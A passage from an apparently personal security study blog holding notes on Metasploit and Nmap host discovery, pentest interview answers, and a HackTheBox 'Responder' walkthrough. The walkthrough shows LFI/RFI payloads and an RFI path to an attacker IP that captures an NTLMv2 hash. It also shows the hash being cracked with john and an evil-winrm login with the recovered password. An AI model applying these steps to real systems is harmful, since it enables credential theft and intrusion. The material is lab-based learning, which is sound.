payloads.</p><ul><li>generic&#x2F;shell_reverse_tcp</li><li>windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp</li></ul><p>Both are reverse Windows shells. The former is an inline (or single) payload, as indicated by the “_” between “shell” and “reverse”. While the latter is a staged payload, as indicated by the “&#x2F;” between “shell” and “reverse”.</p><p><strong>Post:</strong> Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.(后渗透)</p><h4 id="Msfconsole"><a href="#Msfconsole" class="headerlink" title="Msfconsole"></a>Msfconsole</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">clear</span><br><span class="line">ping -c 1 8.8.8.8 #ping一次</span><br><span class="line">history #查看输入的历史命令</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue  选择我们要利用的漏洞</span><br><span class="line">show options 设置参数</span><br><span class="line">show payloads 选择利用漏洞的特定代码</span><br><span class="line">info 查看某个模块的具体信息</span><br><span class="line">info exploit/windows/smb/ms17_010_eternalblue 或者在具体模块下</span><br><span class="line">search:此命令将在Metasploit Framework数据库中搜索与给定搜索参数相关的模块。您可以使用 CVE号码进行搜索,利用名称(永恒的蓝色，心脏出血等),或操作系统。</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; back</span><br><span class="line">msf6 &gt; </span><br></pre></td></tr></table></figure><p>Questions:</p><p>Who provided the auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login module?</p><p>todb(使用info命令查看模块信息)</p><h4 id="Working-with-modules"><a href="#Working-with-modules" class="headerlink" title="Working with modules"></a>Working with modules</h4><p>Meterpreter 是一个重要的有效负载，这意味着 Meterpreter 代理已加载到目标系统并连接回您。您可以在这里使用 Meterpreter执行特定的命令。</p><p>Parameters you will often use are:</p><ul><li><p><strong>RHOSTS:</strong> “Remote host”, the IP address of the target system. A single IP address or a network range can be set. This will support the CIDR (Classless Inter-Domain Routing) notation (&#x2F;24, &#x2F;16, etc.) or a network range (10.10.10.x – 10.10.10.y). You can also use a file where targets are listed, one target per line using file:&#x2F;path&#x2F;of&#x2F;the&#x2F;target_file.txt, as you can see below.</p></li><li><p><strong>RPORT:</strong> “Remote port”, the port on the target system the vulnerable application is running on.</p></li><li><p><strong>PAYLOAD:</strong> The payload you will use with the exploit.(利用代码)</p></li><li><p><strong>LHOST:</strong> “Localhost”, the attacking machine (your AttackBox or Kali Linux) IP address.</p></li><li><p><strong>LPORT:</strong> “Local port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application.</p></li><li><p><strong>SESSION:</strong> Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unset all:在模块中清除所有参数</span><br><span class="line">可以使用 setg 命令设置将用于所有模块的值。Setg 命令与 set 命令类似。区别在于，如果使用 set 命令使用模块设置值，并切换到另一个模块，则需要再次设置该值。</span><br><span class="line">unsetg</span><br><span class="line">exploit/run:运行模块(参数设置完以后)</span><br><span class="line">check:检查目标系统是否可以利用</span><br><span class="line"></span><br><span class="line">meterpreter &gt; background  #退出会话</span><br><span class="line">[*] Backgrounding session 2...</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; </span><br><span class="line">sessions -i 2:选择会话2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Nmap Live Host Discovery</title>
      <link href="/posts/9fd98a15.html"/>
      <url>/posts/9fd98a15.html</url>
      
        <content type="html"><![CDATA[<h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>攻击一个特定的网络，我们需要了解:</p><p>1.目标网络存活多少台系统</p><p>2.系统上运行着哪些服务</p><p>nmap:</p><p>1.存活主机发现</p><p>2.端口扫描</p><p>3.开机自检端口扫描</p><p>We present the <strong>different approaches</strong> that Nmap uses to discover live hosts. In particular, we cover:</p><ol><li>ARP scan: This scan uses ARP requests to discover live hosts</li><li>ICMP scan: This scan uses ICMP requests to identify live hosts</li><li>TCP&#x2F;UDP ping scan: This scan sends packets to TCP ports and UDP ports to determine live hosts.</li></ol><p>We also introduce two scanners, <strong><code>arp-scan</code> and <code>masscan</code></strong>, and explain how they overlap with part of Nmap’s host discovery.</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f1b4ede255e008646e425038d709c9b6.png" alt="img"></p><p>enumerate:枚举</p><h3 id="Subnetworks"><a href="#Subnetworks" class="headerlink" title="Subnetworks"></a>Subnetworks</h3><p>网段:</p><p>使用共享媒介连接的一组计算机。媒介可以是以太网交换机或wifi接入点。</p><p>在IP网络中，子网相当于一个或多个网段连接在一起，并配置为使用相同的路由器。</p><p>网络段是指物理连接，而子网络是指逻辑连接(数据传输)(不是物理线路连接在一起)</p><p>下图:</p><p>有4个网段</p><p>一个网段也是子网，两个网段的计算机也是子网，整个大网络的一部分</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/aa787518e856e0094cb40da8399be0f3.png" alt="img"></p><p>一个子网，有它自己的 IP 地址范围，并且通过路由器连接到一个更广泛的网络。可能存在一个防火墙，根据每个网络执行安全策略。</p><p>The figure above shows two types of subnets:</p><ul><li>Subnets with <code>/16</code>, which means that the subnet mask can be written as <code>255.255.0.0</code>. This subnet can have around 65 thousand hosts.</li><li>Subnets with <code>/24</code>, which indicates that the subnet mask can be expressed as <code>255.255.255.0</code>. This subnet can have around 250 hosts.</li></ul><p>作为主动侦察的一部分，我们希望发现有关一组主机或一个子网的更多信息。如果您连接到相同的子网，您会期望您的扫描器依赖于 ARP (地址解析协议)查询来发现活动主机。<strong>ARP 查询的目的是获取硬件地址(MAC 地址)</strong> ，这样就可以通过链路层进行通信; 然而，我们可以利用这一点来推断主机是在线的。</p><p>ARP查询可以扫描当前内网段的机器。</p><p> 然而，ARP 查询将不会被路由，因此不能穿过子网路由器。ARP 是一个链路层协议，ARP 数据包被绑定到它们的子网。</p><p>交换机的功能是连接计算机、服务器、网络打印机、网络摄像头、IP电话等终端设备，并实现与其它交换机、无线接入点、路由器、网络防火墙等网络设备的互联，从而构建局域网络，实现所有设备之间的通信。</p><h3 id="Enumerating-Targets-枚举目标"><a href="#Enumerating-Targets-枚举目标" class="headerlink" title="Enumerating Targets(枚举目标)"></a>Enumerating Targets(枚举目标)</h3><p>nmap -iL list_of_host.txt:从文件中加载ip地址</p><p>nmap -sL:以列表形式扫描目标</p><p>​nmap -sL MACHINE_IP,scanme.nmap.org,example.com</p><p>Qustions:</p><p>1.What is the first IP address Nmap would scan if you provided <code>10.10.12.13/29</code> as your target?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.12.8</span><br></pre></td></tr></table></figure><p>2.How many IP addresses will Nmap scan if you provide the following range <code>10.10.0-255.101-125</code>? </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6400(256*25)</span><br></pre></td></tr></table></figure><h3 id="Discovering-Live-Hosts"><a href="#Discovering-Live-Hosts" class="headerlink" title="Discovering Live Hosts"></a>Discovering Live Hosts</h3><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/745e0412b319d324352c7b29863b74f4.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use:</span><br><span class="line">ARP from Link Layer 链路层</span><br><span class="line">ICMP from Network Layer 网络层</span><br><span class="line">TCP from Transport Layer 传输层</span><br><span class="line">UDP from Transport Layer 传输层</span><br></pre></td></tr></table></figure><p>ARP 有一个目的: 发送一个帧到网络段上的广播地址，并要求具有特定 IP 地址的计算机通过提供其 MAC (硬件)地址进行响应。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">广播地址(Broadcast Address):</span><br><span class="line">专门用于同时向网络中所有工作站进行发送的一个地址。在使用TCP/IP 协议的网络中，主机标识段host ID为全1的IP地址为广播地址，广播的分组传送给host ID段所涉及的所有计算机。例如，对于10.1.1.0 （255.0.0.0 ）网段，其直播广播地址为10.255.255.255 （255 即为2 进制的11111111）,当发出一个目的地址为10.255.255.255 的分组（封包）时，它将被分发给该网段上的所有计算机。</span><br></pre></td></tr></table></figure><p>ICMP has many types.ICMP ping uses Type 8 (Echo) and Type 0 (Echo Reply).</p><p><strong>如果您想在同一个子网上 ping 一个系统，那么在 ICMP Echo 之前应该有一个 ARP 查询。</strong></p><p>​先确定目标的mac地址</p><p>虽然 TCP 和 UDP 是传输层，但是为了网络扫描的目的，<strong>扫描器可以向公共 TCP 或 UDP 端口发送特制的数据包，以检查目标是否会响应</strong>。这种方法是有效的，特别是当 ICMP 回波被阻塞。</p><p>Question:<br>Send a packet with the following:</p><ul><li>From computer2</li><li>To computer5</li><li>Packet Type: “Ping Request”</li></ul><p>2和5在不同的网段下，通过路由器连接</p><p>​由于2和5不在同一个网段下，所以2会先发送arp包去找路由器</p><p>​此时2发送ping包</p><p>​路由器发送arp包询问5在哪，5回答以后接收到ping包</p><h3 id="Nmap-Host-Discovery-Using-ARP"><a href="#Nmap-Host-Discovery-Using-ARP" class="headerlink" title="Nmap Host Discovery Using ARP"></a>Nmap Host Discovery Using ARP</h3><p>When no host discovery options are provided, Nmap follows the following approaches to discover live hosts:</p><ol><li>When a <em>privileged</em> user tries to scan targets on a local network (Ethernet), Nmap uses <em>ARP requests</em>. A privileged user is <code>root</code> or a user who belongs to <code>sudoers</code> and can run <code>sudo</code>.</li><li>When a <em>privileged</em> user tries to scan targets outside the local network, Nmap uses ICMP echo requests, TCP ACK (Acknowledge) to port 80, TCP SYN (Synchronize) to port 443, and ICMP timestamp request.</li><li>When an <em>unprivileged</em> user tries to scan targets outside the local network, Nmap resorts to a TCP 3-way handshake by sending SYN packets to ports 80 and 443.</li></ol><p>discover online hosts without port-scanning the live systems:<strong>nmap -sn TARGETS</strong></p><p>perform an <strong>ARP scan</strong> without port-scanning:<strong>nmap -PR -sn TARGETS</strong>(确定在同一个内网)(可以获取到内网机器的mac地址)</p><h4 id="arp-scan"><a href="#arp-scan" class="headerlink" title="arp-scan"></a>arp-scan</h4><ul><li>arp-scan –localnet&#x2F; arp-scan -l:send ARP queries to all valid IP addresses on your local networks</li><li><code>sudo arp-scan -I eth0 -l</code>:send ARP queries for all valid IP addresses on the <code>eth0</code> interface.</li></ul><h3 id="Nmap-Host-Discovery-Using-ICMP"><a href="#Nmap-Host-Discovery-Using-ICMP" class="headerlink" title="Nmap Host Discovery Using ICMP"></a>Nmap Host Discovery Using ICMP</h3><p>We can ping every IP address on a target network and see who would respond to our <code>ping</code> (ICMP Type 8&#x2F;Echo) requests with a ping reply (ICMP Type 0).</p><p>it is not always reliable: <strong>many firewalls block ICMP echo</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -PE -sn TARGET:use ping(ICMP Type 8/echo) to discover without port scan</span><br><span class="line">nmap -PP -sn TARGET:use timestamp request(ICMP Type 13) and check whether it will get a reply(ICMP Type 14)</span><br><span class="line">nmap -PM -sn TARGET:ICMP Address Mask Request</span><br></pre></td></tr></table></figure><p>Each ICMP request was sent twice.</p><h3 id="Nmap-Host-Discovery-Using-TCP-and-UDP"><a href="#Nmap-Host-Discovery-Using-TCP-and-UDP" class="headerlink" title="Nmap Host Discovery Using TCP and UDP"></a>Nmap Host Discovery Using TCP and UDP</h3><h4 id="TCP-SYN-Ping"><a href="#TCP-SYN-Ping" class="headerlink" title="TCP SYN Ping"></a>TCP SYN Ping</h4><p>原理:将设置了 SYN (Synchronize)标志的数据包发送到一个 TCP 端口，<strong>默认情况下为80</strong>，然后等待响应。<strong>打开的端口</strong>应该使用 SYN&#x2F;ACK (知道)进行响应; <strong>关闭的端口</strong>将导致 RST (重置)。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/23e7f481f78de8d3e89ef845b747002d.png" alt="img"></p><p>TCP SYN ping:-PS  -PS21 -PS21-24  -PS80,443,8080</p><p><strong>Privileged users</strong> (root and sudoers) can send TCP SYN packets and <strong>don’t need to complete the TCP 3-way handshake</strong> even if the port is open, as shown in the figure below. Unprivileged users have no choice but to complete the 3-way handshake if the port is open.</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/168d48701c5f872cf1930e08b32bcd6f.png" alt="img"></p><h4 id="TCP-ACK-Ping"><a href="#TCP-ACK-Ping" class="headerlink" title="TCP ACK Ping"></a>TCP ACK Ping</h4><p><strong>You must be running Nmap as a privileged user to be able to accomplish this.</strong></p><p><strong>By default, port 80 is used.</strong> </p><p><strong>-PA</strong></p><p>下图显示了任何带有 ACK 标志的 TCP 数据包都应该返回设置了 RST 标志的 TCP 数据包。由于带有 ACK 标志的 TCP 包不是任何正在进行的连接的一部分，因此目标使用设置的 RST 标志进行响应。预期响应用于检测目标主机是否已启动。</p><h4 id="UDP-Ping"><a href="#UDP-Ping" class="headerlink" title="UDP Ping"></a>UDP Ping</h4><p>-PU</p><p>we see a UDP packet sent to an open UDP port and not triggering any response. However, <strong>sending a UDP packet to any closed UDP port</strong> can trigger a response indirectly indicating that the target is online.</p><p>Question:</p><p>Which TCP ping scan does not require a privileged account?</p><p>TCP SYN PING</p><p>Which TCP ping scan requires a privileged account?</p><p>TCP ACK PING</p><p>What option do you need to add to Nmap to run a TCP SYN ping scan on the telnet port?</p><p>-PS23</p><h4 id="Using-Reverse-DNS-Lookup"><a href="#Using-Reverse-DNS-Lookup" class="headerlink" title="Using Reverse-DNS Lookup"></a>Using Reverse-DNS Lookup</h4><p>Nmap’s default behaviour is to use reverse-DNS online hosts. Because the hostnames can reveal a lot, this can be a helpful step. However, if you don’t want to send such DNS queries, you use <code>-n</code> to skip this step.</p><p>By default, Nmap will look up online hosts; however, you can use the option <code>-R</code> to query the DNS server even for offline hosts. If you want to use a specific DNS server, you can add the <code>--dns-servers DNS_SERVER</code> option.</p><h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><p>You have learned how ARP, ICMP, TCP, and UDP can detect(检测) live hosts by completing this room. Any response from a host is an indication that it is online. Below is a quick summary of the command-line options for Nmap that we have covered.</p><table><thead><tr><th>Scan Type</th><th>Example Command</th></tr></thead><tbody><tr><td>ARP Scan</td><td><code>sudo nmap -PR -sn MACHINE_IP/24</code></td></tr><tr><td>ICMP Echo Scan</td><td><code>sudo nmap -PE -sn MACHINE_IP/24</code></td></tr><tr><td>ICMP Timestamp Scan</td><td><code>sudo nmap -PP -sn MACHINE_IP/24</code></td></tr><tr><td>ICMP Address Mask Scan</td><td><code>sudo nmap -PM -sn MACHINE_IP/24</code></td></tr><tr><td>TCP SYN Ping Scan</td><td><code>sudo nmap -PS22,80,443 -sn MACHINE_IP/30</code></td></tr><tr><td>TCP ACK Ping Scan</td><td><code>sudo nmap -PA22,80,443 -sn MACHINE_IP/30</code></td></tr><tr><td>UDP Ping Scan</td><td><code>sudo nmap -PU53,161,162 -sn MACHINE_IP/30</code></td></tr></tbody></table><p>Remember to add <code>-sn</code> <strong>if you are only interested in host discovery without port-scanning</strong>. Omitting(忽略) <code>-sn</code> will let Nmap default to port-scanning the live hosts.</p><table><thead><tr><th>Option</th><th>Purpose</th></tr></thead><tbody><tr><td><code>-n</code></td><td>no DNS lookup</td></tr><tr><td><code>-R</code></td><td>reverse-DNS lookup for all hosts</td></tr><tr><td><code>-sn</code></td><td>host discovery only</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h3 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h3><p>1.由mysql构建的网站，为何只有80端口开放?</p><p>​<a href="https://cn-sec.com/archives/175685.html">站库分离常规渗透思路总结 | CN-SEC 中文网</a></p><p>​站库分离&#x2F;3306端口对外不开放(一般的服务器的安全策略是可以做到的)</p><p>​站库分离其实就是管理员将网站程序和数据库分别放在了不同的内网服务器上，这样看似提高了数据安全性，但是如果网站存在漏洞，攻击者还是有可能以Web或Data为入口访问到内网数据库服务器中的数据。</p><p>​这种情况大多出现在内网环境，不过也有少部分管理员会使用公网数据库，如：自建公网数据库、Amazon&#x2F;阿里&#x2F;腾讯&#x2F;华为RDS云数据库等，并设置允许连接该数据库的白名单IP地址。</p><p>2.审查上传点的元素的意义？</p><p>​判断文件上传是否在前端做了限制</p><p>3.3389无法连接的几种情况</p><ul><li>端口被修改</li><li>没开放3389端口</li><li>防护拦截(服务器自身&#x2F;防火墙对行为拦截)</li><li>处于内网环境(端口转发)</li><li></li></ul><p>4.目标站禁止注册用户,找回密码处随便输入用户名提示:此用户不存在，如何利用？</p><p>​存在数据库交互,尝试sql注入爆破用户名和密码</p><p>5.目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403，什么原因？(<strong>没碰到过</strong>)</p><p>​403:forbidden</p><p>​服务器配置将上传目录的权限写死了，让其无法执行脚本程序(无权限)</p><p>6.至少三种业务逻辑漏洞和修复方式</p><p>​  密码找回漏洞中存在密码允许暴力破解、存在通用型找回凭证、可以跳过验证步骤、找  回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码；  身份认证漏洞中最常见的是会话固定攻击和 Cookie 仿冒，只要得到 Session 或 Cookie 即可  伪造用户身份；  </p><pre><code>  验证码漏洞中存在验证码允许暴力破解、验证码可以通过 Javascript 或者改包的方法来进行  绕过。</code></pre><p>7.owasp top10</p><p>  1）注入  2）失效的身份认证   3）敏感信息泄露  4）XML 外部实体（XXE）  5）失效的访问控制   6）安全配置错误  7）跨站脚本（XSS）；8）不安全的反序列化9）使用含有已知漏洞的组件 10）不足的日志记录和监控  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2021:</span><br><span class="line">A10:服务端请求伪造</span><br><span class="line">A08:软件和数据完整性故障(不安全的反序列化属于本类一部分)</span><br><span class="line">A04:不安全设计</span><br><span class="line">A02:加密机制失效(以前:敏感信息泄漏,作为加密机制失效的常见症状)</span><br><span class="line">A01:失效的访问控制</span><br></pre></td></tr></table></figure><p>8.csrf,xss,xxe的区别和修复方式</p><p>  XSS 是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻  击。</p><p>修复方式：对字符实体进行转义</p><p>​使用 HTTP Only 来禁 JavaScript 读取 Cookie 值、输入时校验、浏览器与 Web 应用端采用相同的字符编码。  </p><p> CSRF 是跨站请求伪造攻击，XSS 是实现 CSRF 的诸多手段中的一种，是由于没有在关键操作  执行时进行是否由用户自愿发起的确认。</p><p>修复方式：筛选出需要防范 CSRF 的页面然后嵌入Token、再次输入密码、检验 Referer。  </p><p> XXE 是 XML 外部实体注入攻击，XML 中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。</p><p>修复方式：XML 解析库在调用时严格禁止对外部实体的解析。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox学习记录</title>
      <link href="/posts/86ad6a21.html"/>
      <url>/posts/86ad6a21.html</url>
      
        <content type="html"><![CDATA[<h3 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h3><p><strong>1.When visiting the web service using the IP address, what is the domain that we are being redirected to?</strong><br>unika.htb</p><p>先用nmap扫描目标主机开放端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -T4 10.128.255.140</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/27/YFxbDhJtecs7T9M.png" alt="image.png"></p><p><img src="https://s2.loli.net/2023/01/27/m2B7bDIQ9KeN6Z5.png" alt="image.png"></p><p>发现没东西,选择查看网页源代码,成功发现domain</p><p>url&#x3D;<a href="http://unika.htb/">http://unika.htb/</a></p><p><strong>2.Which scripting language is being used on the server to generate webpages?</strong></p><p>提示:脚本语言(结合nmap扫描出的结果)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php</span><br></pre></td></tr></table></figure><p>可以使用Wappalyzer插件直接查看</p><p><img src="https://s2.loli.net/2023/01/27/qbopHhTwizPYVvI.png" alt="image.png"></p><p><strong>3.What is the name of the URL parameter which is used to load different language versions of the webpage?</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page</span><br></pre></td></tr></table></figure><p>解析: 很明显要去访问unika.htb这个地址,但是显示找不到服务器</p><p>原因: 可能是环境内不存在域名服务器导致,需要手动在&#x2F;etc&#x2F;hosts下添加域名与ip的对应关系</p><p><a href="https://www.jianshu.com/p/476a92a39b45">linux环境下&#x2F;etc&#x2F;hosts文件详解 - 简书 (jianshu.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.129.255.140 unika.htb</span><br></pre></td></tr></table></figure><p><strong>4.Which of the following values for the <code>page</code> parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “&#x2F;&#x2F;10.10.14.6&#x2F;somefile”, “..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe”</strong>(本地文件包含漏洞示例)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">../../. ./../../../../../windows/system32/drivers/etc/hosts</span><br><span class="line">语言转换处可能存在文件包含漏洞</span><br><span class="line">吐槽: 好奇怪的文件路径</span><br></pre></td></tr></table></figure><p><strong>5.Which of the following values for the <code>page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “&#x2F;&#x2F;10.10.14.6&#x2F;somefile”, “..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe”</strong>(远程文件包含)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//10.10.14.6/somefile</span><br></pre></td></tr></table></figure><p><strong>6.What does NTLM stand for?</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New Technology LAN Manager</span><br></pre></td></tr></table></figure><p> 建议英文搜索,中文要找半天</p><p><strong>7.Which flag do we use in the Responder utility to specify the network interface?</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-i</span><br></pre></td></tr></table></figure><p>Responder原理可参考<a href="https://www.freebuf.com/articles/network/256844.html">https://www.freebuf.com/articles/network/256844.html</a></p><p>network interface: 网络接口(网卡)</p><p><strong>8.There are several tools that take a NetNTLMv2 challenge&#x2F;response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as <code>john</code>, but the full name is what?</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john the ripper</span><br></pre></td></tr></table></figure><p><strong>9.What is the password for the administrator user?</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">badminton</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/28/gVmn5tsT9XEAozh.png" alt="image.png"></p><p>ifconfig查看网卡名称tun0</p><p>responder -i tun0: 监听</p><p>配合远程文件包含漏洞**(基于smb协议)**page&#x3D;&#x2F;&#x2F;10.10.16.86&#x2F;somefile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SMB] NTLMv2-SSP Client   : ::ffff:10.129.212.168</span><br><span class="line">[SMB] NTLMv2-SSP Username : RESPONDER\Administrator</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:52fb5afadfa7bspan><br></pre></td></tr></table></figure><p>破解hash</p><p>呃呃,破解一下hash直接cpu爆满</p><p><img src="https://s2.loli.net/2023/01/28/5qz7gTXe36Gf8Vm.png" alt="image.png"></p><p>放到云服务器上运行吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install john</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure><p><strong>10.We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5985</span><br></pre></td></tr></table></figure><p>11.Submit root flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.129.212.168 -u Administrator -p badminton</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/28/i3sQrUXkTWj6NgH.png" alt="image.png"></p><p>经过不断查找,在mike用户的桌面下找到flag.txt</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Content</span> flag.txt</span><br><span class="line">ea81b7afddd03efaa0945333ed147fac</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>1.网络适配器即网卡,是工作在链路层的网络组件,是局域网中连接计算机和传输介质的接口,不仅能实现与局域网传输介质之间的物理连接和电信号匹配,还涉及帧的发送与接收、帧的封装与拆封、介质访问控制、数据的编码与解码以及数据缓存的功能等。</p><p>网络适配器是使计算机联网的设备，平常所说的网卡就是将PC机和LAN连接的网络适配器。网卡插在计算机主板插槽中，负责将用户要传递的数据转换为网络上其它设备能够识别的格式，通过网络介质传输。</p><p>2.NTLM协议理解:</p><p>NTLM主要过程如下:</p><p>​1、客户端首先在本地加密自己的密码成为<strong>密码散列</strong><br>​2、客户端向服务器发送自己的帐号，这个帐号是没有经过加密的，<strong>明文直接传输</strong>。<br>​3、服务器产生一个<strong>16位的随机数字</strong>发送给客户端，作为一个 challenge<br>​4、客户端再用加密后的密码散列来加密这个 challenge ，然后把这个返回给服务器。作为 response。<br>​5、服务器把用户名、给客户端的challenge 、客户端返回的 response 这三个东西，发送域控制器。<br>​6、域控制器用这个用户名在 SAM密码管理库中找到这个用户的密码散列，然后使用这个密码散列来加密 challenge。<br>​7、域控制器比较两次加密的 challenge ，如果一样，那么认证成功。</p><p>目前winserver 2008及以后的windows版本默认均是使用NetNTLMv2的，默认使用NTLMv1的有2003、XP这些机器。</p><p><strong>windows基于NTLM认证的有SMB、HTTP、LDAP、MSSQL等</strong>，responder可以通过模拟正常的SMB协议从而获得受害机器的NTLMV2 hash值，NTLM v2不能直接应用于Pass The Hash攻击，只能通过暴力破解来获取明文密码。而攻击者获取NTLMv1 hash后，可以直接还原NTLM HASH，这样的话就可以将NTLM HASH直接用于Pass The Hash攻击，相较于NTLM v2还需要破解才能利用更加不安全。</p><p>3.域内主机名解析流程:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.查看本地hosts文件</span><br><span class="line"></span><br><span class="line">2.查找DNS缓存，windows可使用命令 ipconfig/displaydns 查看</span><br><span class="line"></span><br><span class="line">3.DNS服务器</span><br><span class="line"></span><br><span class="line">4.尝试LLMNR、NBNS和MDNS协议进行解析</span><br></pre></td></tr></table></figure><p>参考:</p><p><a href="https://www.youtube.com/watch?v=R8GOLiKIA1k">https://www.youtube.com/watch?v=R8GOLiKIA1k</a></p><h3 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h3><p><strong>1.How many TCP ports are open?</strong></p><p>​2</p><p>​nmap -sS -T4 ip 